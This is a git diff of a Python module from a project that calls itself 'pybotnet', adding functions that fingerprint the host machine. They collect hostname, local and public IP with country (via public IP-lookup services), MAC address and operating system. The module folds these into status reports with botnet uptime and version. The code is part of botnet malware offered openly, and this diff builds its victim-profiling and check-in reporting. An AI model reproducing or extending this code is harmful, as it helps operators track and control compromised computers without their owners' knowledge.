@@ -8,31 +8,77 @@ import requests
 import json
 import platform
 
+from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
 
 
-def get_short_system_info(start_time=None, logger=None) -> str:
+def get_host_name_ip() -> str:
+    try:
+        host_name = gethostname()
+        host_ip = gethostbyname(host_name)
+        return f'{host_ip}\nHostname: {host_name}'
+    except:
+        return 'Unknown'
+
+
+def get_my_global_ip() -> str:
+
+    try:
+        return get_my_ip_server_1()
+
+    except:
+        try:
+            return get_my_ip_server_2()
+
+        except:
+            try:
+                return get_my_ip_server_3()
+
+            except:
+                return 'Unknown'
+
+# Servers to get your public IP
+
+
+def get_my_ip_server_1():
+    takeip = requests.post("https://api.myip.com", timeout=3).text
+    ip = str(json.loads(takeip)["ip"])
+    country = str(json.loads(takeip)["country"])
+    ipaddr = f"{ip}\ncountry: {country}"
+    return ipaddr
+
+
+def get_my_ip_server_2():
+    return requests.get('https://api.ipify.org', timeout=3).text
+
+
+def get_my_ip_server_3():
+    return requests.get('https://ident.me', timeout=3).text
+
+
+def get_short_system_info() -> str:
     '''pybotnet version, system mac addres, ip addres, operating system, pybotnet uptime'''
 
     short_system_info = f"""
-pybotnet version: {settings.pybotnet_version}
-pybotnet up time: {None}
 operating system: {platform.system()}
-system mac addres: {get_system_mac_addres()}
-system global ip addres: {None}"""
+mac addres: {get_system_mac_addres()}
+global ip: {get_my_global_ip()}"""
 
     return short_system_info
 
 
-def get_full_system_info(logger=None) -> str:
+def get_full_system_info(pybotnet_uptime='Unknown') -> str:
     f'''return full system info: \n
-    get_short_system_info and system uptime, 
+    get_short_system_info and system uptime, local ip
 
     '''
     full_system_info = f"""{get_short_system_info()}
-system uptime: {None}
+pybotnet up time: {pybotnet_uptime} Seconds
+local ip: {get_host_name_ip()}
+pybotnet version: {settings.pybotnet_version}
     """
+    # TODO: system uptime: {None}
 
     return full_system_info
 
